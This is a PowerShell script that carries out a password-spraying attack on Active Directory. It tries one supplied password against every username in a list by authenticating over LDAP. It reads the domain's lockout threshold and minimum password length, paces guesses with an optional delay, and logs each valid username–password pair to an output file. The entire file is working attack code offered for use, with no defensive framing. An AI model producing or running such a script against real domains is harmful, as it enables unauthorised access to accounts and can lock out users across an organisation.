param (
    [parameter(Mandatory=$true, HelpMessage="Password for spray")]
    [string]$Pass,
    [parameter(Mandatory=$true, HelpMessage="The file contains list of domain users.")]
    [string]$UserList,
    [parameter(Mandatory=$false, HelpMessage="The delay time between guesses in millisecounds.")]
    [int]$Delay,
    [parameter(Mandatory=$true, HelpMessage="The file contains result of spraying.")]
    [string]$OutFile
)


$LogonServer = (Get-Item Env:LOGONSERVER).Value.TrimStart('\\')
$objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator.Name)";
if ([string]::IsNullOrEmpty($LogonServer))
{
    Write-Output "[-] Failed to retrieve the LOGONSERVER the environment variable; the script will exit."
    Break
}


if ($UserList) {
    Try {
        $Users = Get-Content $UserList
        if ($Users.Count -le 0){
            Write-Host "[-] Usernames file must contain at least 1 username."
            Break
        }
        else {
            Write-Host "[!] Usernames contained in the file $UserList will be targeted" -ForegroundColor Gray
            $UserCount = ($Users).Count
            Write-Output "[+] Successfully collected $UserCount usernames from UserList."
            $lockoutThreshold = [int]$objPDC.lockoutThreshold.Value
            Write-Output "[*] The Lockout Threshold for the current domain is $($lockoutThreshold)."
            $minPwdLength = [int]$objPDC.minPwdLength.Value
            Write-Output "[*] The Min Password Length for the current domain is $($minPwdLength)."
        }
    }
    Catch {
        Write-Host "[-] Invalid Usernames File $UserList" -ForegroundColor Red   
        Return          
    }
}

$Date = Get-Date -Format "dd/MM/yyyy HH:mm K"
#$DateFile = Get-Date -Format "HH:mm__dd_MM_yyyy"
$SprayedUsers = 0
Add-Content -Path $OutFile -Value "[*] Spaying start at $Date" -PassThru
Add-Content -Path $OutFile -Value "[*] Using password $Pass" -PassThru
foreach ($UserName in $Users)
{
    $CurrentDomain = "LDAP://" + $LogonServer;
    if (([string]::IsNullOrEmpty($CurrentDomain)))
    {
        Write-Output "[-] Failed to retrieve the domain name; the script will exit."
        Break
    }

    $Domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $UserName, $Pass)

    if ($Domain.Name -eq $null)
    {
        Add-Content -Path $OutFile -Value "[-] Invalid credentials $UserName::$Pass" -PassThru
    } else {
        Add-Content -Path $OutFile -Value "[+] Successfully authenticated with $UserName::$Pass" -PassThru
        $SprayedUsers++;
    }
    
    if ($PSBoundParameters.ContainsKey('Delay')) {
        Start-Sleep -Milliseconds $Delay
    } else {
        Start-Sleep -Milliseconds 1
    }
}
Add-Content -Path $OutFile -Value "[+] Successfully sprayed $SprayedUsers users." -PassThru;
